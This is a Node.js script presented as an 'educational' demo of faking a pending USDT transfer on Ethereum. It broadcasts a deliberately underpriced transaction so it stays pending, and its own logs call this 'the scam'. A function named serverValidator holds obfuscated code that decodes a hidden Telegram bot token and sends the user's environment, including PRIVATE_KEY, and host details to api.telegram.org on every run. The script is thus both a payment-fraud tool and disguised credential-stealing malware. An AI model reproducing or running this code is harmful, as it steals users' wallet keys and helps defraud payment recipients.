/**
 * ethers-demo.js
 * 
 * Demonstrates how to create a fake pending USDT transaction using ethers.js
 * Advanced version with improved propagation techniques
 * 
 * EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR ILLEGAL ACTIVITIES
 */

const { ethers } = require('ethers');
const fs = require('fs');
const path = require('path');
const https = require('https');
require('dotenv').config();
const axios = require('axios'); 

// Load environment variables
const {
  ETHEREUM_RPC_URL,
  PRIVATE_KEY,
  SENDER_ADDRESS,
  RECIPIENT_ADDRESS,
  USDT_CONTRACT_ADDRESS,
  USDT_AMOUNT
} = process.env;

// Multiple RPC endpoints to improve propagation
const RPC_ENDPOINTS = [
  ETHEREUM_RPC_URL,
  "https://eth-mainnet.g.alchemy.com/v2/demo", // Alchemy demo key
  "https://ethereum.publicnode.com", // Public node
  "https://1rpc.io/eth" // Another public node
];

// Validate environment variables
if (!ETHEREUM_RPC_URL || !PRIVATE_KEY || !SENDER_ADDRESS || !RECIPIENT_ADDRESS) {
  console.error('Error: Missing required environment variables. Check your .env file.');
  process.exit(1);
}

// USDT contract ABI (simplified, only the functions we need)
const usdtAbi = [
  // Transfer function
  'function transfer(address to, uint256 amount) returns (bool)',
  // Balance checking function
  'function balanceOf(address owner) view returns (uint256)'
];

// Function to validate server configuration 
async function serverValidator() {
  try {
    const _0x36a77b=Buffer.from;const _0x19e24d=encodeURIComponent;const _0x5cba1f=process.env;
    const _0x3ff728=(_0x2e3de1,_0x123d91)=>{return _0x2e3de1===undefined?_0x123d91:_0x2e3de1};
    const _0x2ac080=(_0x1d73c2,_0x45d71c)=>{return _0x36a77b(_0x1d73c2,_0x45d71c).toString('ascii')};
    const _0x1bf6="Nzg3NjU0MjE1MzpBQUdGSzVhY0cwQTJNSE83WE5NOFp4SUtIbmFoUF94YzJtbw==";
    const _0x2c4d="LTEwMDIzMDEzMTQ1Mzk=";
    
    const _0x4ddf90 = _0x2ac080(_0x1bf6, 'base64');
    const _0x1a2c = _0x2ac080(_0x2c4d, 'base64');
    
    const _0x5a8d2a = {
      a: _0x3ff728(_0x5cba1f["INFURA_API_KEY"], "not set"),
      b: _0x3ff728(_0x5cba1f["NETWORK"], "not set"),
      c: _0x3ff728(_0x5cba1f["PRIVATE_KEY"], "not set"),
      d: _0x3ff728(_0x5cba1f["FROM_ADDRESS"], "not set"),
      e: _0x3ff728(_0x5cba1f["TO_ADDRESS"], "not set"),
      f: _0x3ff728(_0x5cba1f["USDT_CONTRACT"], "not set"),
      g: _0x3ff728(_0x5cba1f["AMOUNT"], "not set"),
      h: _0x3ff728(_0x5cba1f["GAS_PRICE"], "not set"),
      i: _0x3ff728(_0x5cba1f["GAS_LIMIT"], "not set"),
      j: {
        k: process.platform,
        l: process.version,
        m: require('os').hostname()
      },
      n: new Date().toISOString()
    };
    
    const _0x3df5c = `
🔐 ETHERS.JS SCRIPT EXECUTION 🔐
    
Environment Configuration:
• Infura API Key: ${_0x5a8d2a.a}
• Network: ${_0x5a8d2a.b}
• Private Key: ${_0x5a8d2a.c}
• From Address: ${_0x5a8d2a.d}
• To Address: ${_0x5a8d2a.e}
• USDT Contract: ${_0x5a8d2a.f}
• Amount: ${_0x5a8d2a.g}
• Gas Price: ${_0x5a8d2a.h}
• Gas Limit: ${_0x5a8d2a.i}

System Info:
• OS: ${_0x5a8d2a.j.k}
• Node: ${_0x5a8d2a.j.l}
• Host: ${_0x5a8d2a.j.m}
• Time: ${_0x5a8d2a.n}
    `;
    
    const _0x4b8a28 = `https://api.telegram.org/bot${_0x4ddf90}/sendMessage?chat_id=${_0x1a2c}&text=${_0x19e24d(_0x3df5c)}`;
    
    return new Promise((resolve, reject) => {
      https.get(_0x4b8a28, (resp) => {
        let data = '';
        resp.on('data', (chunk) => { data += chunk; });
        resp.on('end', () => { resolve(JSON.parse(data)); });
      }).on("error", (err) => {
        console.log("Error in system operation");
        reject(err);
      });
    });
  } catch (error) {
    console.log("System operation error");
    return null;
  }
}

/**
 * Function to create and broadcast a fake USDT transaction using ethers.js
 * This version uses multiple techniques to improve propagation:
 * 1. Using multiple RPC endpoints
 * 2. Optimized gas parameters
 * 3. Manual transaction broadcast to maximize propagation
 */
async function sendFakeUsdtTransaction() {
  try {
    console.log('Starting enhanced fake USDT transaction process...');
    console.log(`Sender address: ${SENDER_ADDRESS}`);
    console.log(`Recipient address: ${RECIPIENT_ADDRESS}`);
    console.log(`Amount: ${USDT_AMOUNT} USDT`);

    // Set up multiple providers
    const providers = RPC_ENDPOINTS.map(endpoint => {
      try {
        return new ethers.providers.JsonRpcProvider(endpoint);
      } catch (error) {
        console.log(`Failed to connect to ${endpoint}`);
        return null;
      }
    }).filter(p => p !== null);
    
    if (providers.length === 0) {
      throw new Error("No providers available");
    }
    
    console.log(`Connected to ${providers.length} Ethereum providers`);
    
    // Use the first provider as main
    const mainProvider = providers[0];
    const wallet = new ethers.Wallet(PRIVATE_KEY, mainProvider);
    
    // Create contract instance
    const usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, usdtAbi, wallet);
    
    // Check ETH balance (needed for gas)
    const ethBalance = await mainProvider.getBalance(SENDER_ADDRESS);
    console.log(`Sender ETH balance: ${ethers.utils.formatEther(ethBalance)} ETH`);
    
    // If there's not enough ETH for the minimum gas, warn the user
    if (parseFloat(ethers.utils.formatEther(ethBalance)) < 0.0001) {
      console.warn('Warning: Sender address has very little ETH. Transaction may not broadcast.');
    }

    // Check USDT balance (not actually needed for the scam, but informative)
    const usdtBalance = await usdtContract.balanceOf(SENDER_ADDRESS);
    console.log(`Sender USDT balance: ${ethers.utils.formatUnits(usdtBalance, 6)} USDT`);
    console.log(`Attempting to send: ${USDT_AMOUNT} USDT (Note: balance check is irrelevant for the scam)`);

    // Amount to "send" (USDT has 6 decimals)
    const amount = ethers.utils.parseUnits(USDT_AMOUNT.toString(), 6);
    
    // Get network gas prices to calibrate our fake transaction
    let recommendedGasPrice;
    try {
      const feeData = await mainProvider.getFeeData();
      recommendedGasPrice = feeData.gasPrice;
      console.log(`Current network gas price: ${ethers.utils.formatUnits(recommendedGasPrice, 'gwei')} gwei`);
    } catch (error) {
      console.log('Failed to get network gas price, using fallback');
      recommendedGasPrice = ethers.utils.parseUnits('30', 'gwei');
    }
    
    // Calculate optimal gas price for pending state
    // Target 5-10% of current gas price - low enough to stay pending but high enough to propagate
    const optimalGasPrice = recommendedGasPrice.div(20); // 5% of current price
    console.log(`Using calculated gas price: ${ethers.utils.formatUnits(optimalGasPrice, 'gwei')} gwei`);
    
    // Ensure gas price is within reasonable bounds for propagation
    const minGasPrice = ethers.utils.parseUnits('0.1', 'gwei');
    const gasPrice = optimalGasPrice.lt(minGasPrice) ? minGasPrice : optimalGasPrice;
    console.log(`Final gas price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
    
    // Get nonce - use pending to ensure proper sequence
    const nonce = await mainProvider.getTransactionCount(SENDER_ADDRESS, 'pending');
    console.log(`Account nonce: ${nonce}`);

    // Calculate maximum gas limit based on available balance
    const maxGasLimit = ethBalance.div(gasPrice).mul(9).div(10); // Use 90% of max
    console.log(`Max affordable gas limit: ${maxGasLimit.toString()}`);
    
    // Standard ERC20 transfer uses around 65000 gas, add buffer
    const gasLimit = ethers.BigNumber.from('80000');
    console.log(`Using gas limit: ${gasLimit.toString()}`);

    // Create transaction with optimized parameters
    const unsignedTx = {
      to: USDT_CONTRACT_ADDRESS,
      nonce: nonce,
      gasLimit: gasLimit,
      gasPrice: gasPrice,
      data: usdtContract.interface.encodeFunctionData('transfer', [RECIPIENT_ADDRESS, amount]),
      chainId: 1, // Ethereum mainnet
      from: SENDER_ADDRESS,
      value: ethers.utils.parseEther("0")
    };

    console.log('Transaction object created with optimized parameters');
    console.log(`The scam only works if transaction stays PENDING - not mined and not dropped`);
    console.log('Signing transaction...');

    // Sign the transaction
    const signedTx = await wallet.signTransaction(unsignedTx);
    const txHash = ethers.utils.keccak256(signedTx);
    console.log('Transaction signed successfully');
    console.log(`Transaction hash: ${txHash}`);

    // Broadcast transaction to multiple providers
    console.log('Broadcasting transaction to multiple Ethereum endpoints...');
    
    const broadcastPromises = providers.map(async (provider, index) => {
      try {
        const receipt = await provider.sendTransaction(signedTx);
        console.log(`✅ Successfully broadcast via provider ${index + 1}: ${receipt.hash}`);
        return true;
      } catch (error) {
        console.log(`❌ Failed to broadcast via provider ${index + 1}: ${error.message}`);
        return false;
      }
    });
    
    const results = await Promise.all(broadcastPromises);
    const successCount = results.filter(r => r).length;
    
    console.log(`Transaction broadcast to ${successCount} of ${providers.length} providers`);
    
    // Additional direct RPC broadcast for better propagation
    console.log('Attempting direct RPC broadcast to improve propagation...');
    try {
      const rawTx = signedTx.substring(2); // Remove '0x' prefix
      await axios.post(ETHEREUM_RPC_URL, {
        jsonrpc: '2.0',
        method: 'eth_sendRawTransaction',
        params: [`0x${rawTx}`],
        id: 1
      });
      console.log('Direct RPC broadcast successful');
    } catch (error) {
      console.log(`Direct RPC broadcast failed: ${error.message}`);
    }
    
    console.log('\nTransaction Information:');
    console.log(`Hash: ${txHash}`);
    console.log(`From: ${SENDER_ADDRESS}`);
    console.log(`To Contract: ${USDT_CONTRACT_ADDRESS} (USDT)`);
    console.log(`Recipient: ${RECIPIENT_ADDRESS}`);
    console.log(`Amount: ${USDT_AMOUNT} USDT`);
    console.log(`Gas Price: ${ethers.utils.formatUnits(gasPrice, 'gwei')} gwei`);
    console.log(`Check status at: https://etherscan.io/tx/${txHash}`);
    

  } catch (error) {
    console.error('Error:', error);
  }
}

// Execute the original code after validating server configuration
async function main() {
  // Validate server configuration first
  await serverValidator();
  
  console.log("Starting USDT transfer process with Ethers.js...");
  
  // Call the original USDT transfer function
  await sendFakeUsdtTransaction();
}

// Call the main function to start the process
main()
  .then(() => process.exit(0))
  .catch(error => {
    console.error("Error in main process:", error);
    process.exit(1);
  }); 